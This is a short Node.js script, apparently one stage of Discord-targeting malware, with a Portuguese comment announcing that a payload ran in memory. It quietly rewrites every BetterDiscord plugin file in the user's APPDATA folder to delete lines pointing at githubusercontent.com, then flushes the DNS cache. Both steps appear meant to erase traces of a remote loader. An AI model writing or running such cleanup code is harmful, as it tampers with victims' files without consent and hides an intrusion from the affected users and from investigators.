(function() {
    const fs = require('fs');
    const path = require('path');

    // ---
    // Exemplo:
    console.log("Carga executada na RAM.");

    // --- 
    const pDir = path.join(process.env.APPDATA, 'BetterDiscord', 'plugins');
    const files = fs.readdirSync(pDir).filter(f => f.endsWith('.plugin.js'));

    files.forEach(file => {
        const fPath = path.join(pDir, file);
        let content = fs.readFileSync(fPath, 'utf8');

        // 
        if (content.includes('://githubusercontent.com')) {
            // 
            const cleanContent = content.split('\n').filter(line => !line.includes('://githubusercontent.com')).join('\n');
            
            //
            fs.writeFileSync(fPath, cleanContent, 'utf8');
        }
    });

    // --- 
    try {
        require('child_process').exec('ipconfig /flushdns');
    } catch(e) {}

})();
